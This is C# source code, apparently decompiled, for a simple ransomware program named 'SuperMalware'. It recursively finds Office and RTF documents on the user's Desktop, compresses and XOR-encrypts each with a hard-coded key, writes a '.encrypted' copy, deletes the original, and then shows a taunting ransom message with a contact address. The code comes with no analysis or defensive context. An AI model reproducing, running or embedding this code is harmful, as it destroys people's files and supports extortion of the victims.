using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Windows.Forms;

namespace JackieChan;

internal class SuperMalware
{
	public static class SafeWalk
	{
		public static IEnumerable<string> EnumerateFiles(string path, string searchPattern, SearchOption searchOpt)
		{
			try
			{
				IEnumerable<string> first = Enumerable.Empty<string>();
				if (searchOpt == SearchOption.AllDirectories)
				{
					first = Directory.EnumerateDirectories(path).SelectMany((string x) => EnumerateFiles(x, searchPattern, searchOpt));
				}
				return first.Concat(Directory.EnumerateFiles(path, searchPattern));
			}
			catch (UnauthorizedAccessException)
			{
				return Enumerable.Empty<string>();
			}
		}
	}

	public static byte key;

	public static byte[] Compress(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
		{
			deflateStream.Write(data, 0, data.Length);
		}
		return memoryStream.ToArray();
	}

	private static void Main(string[] args)
	{
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		string text = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop");
		Console.WriteLine(text);
		foreach (string item2 in from s in SafeWalk.EnumerateFiles(text, "*.*", SearchOption.AllDirectories)
			where s.EndsWith(".docx") || s.EndsWith(".pptx") || s.EndsWith(".xlsx") || s.EndsWith(".xls") || s.EndsWith(".ppt") || s.EndsWith(".doc") || s.EndsWith(".rtf")
			select s)
		{
			Console.WriteLine(item2);
			if (item2.Length < 10500000)
			{
				byte[] array = Compress(File.ReadAllBytes(item2));
				if (item2.EndsWith(".ppt"))
				{
					key = 103;
				}
				else if (item2.EndsWith(".xlsx"))
				{
					key = 78;
				}
				else if (item2.EndsWith(".pptx"))
				{
					key = 174;
				}
				else
				{
					key = 158;
				}
				List<byte> list = new List<byte>();
				for (int i = 0; i < array.Length; i++)
				{
					byte item = Convert.ToByte(key ^ array[i]);
					list.Add(item);
				}
				byte[] bytes = list.ToArray();
				File.WriteAllBytes(item2 + ".encrypted", bytes);
				File.Delete(item2);
			}
			else
			{
				Console.WriteLine("file too large... skipping");
			}
		}
		MessageBox.Show(Environment.ExpandEnvironmentVariables("Dear %USERNAME%,\nTeeeheee! This is not your lucky day!!\n\nwe stole all your fileZ and ENCRYTPED THEM...\n\n\ncontact us at badgrid@onion.to if you want them back"));
	}
}
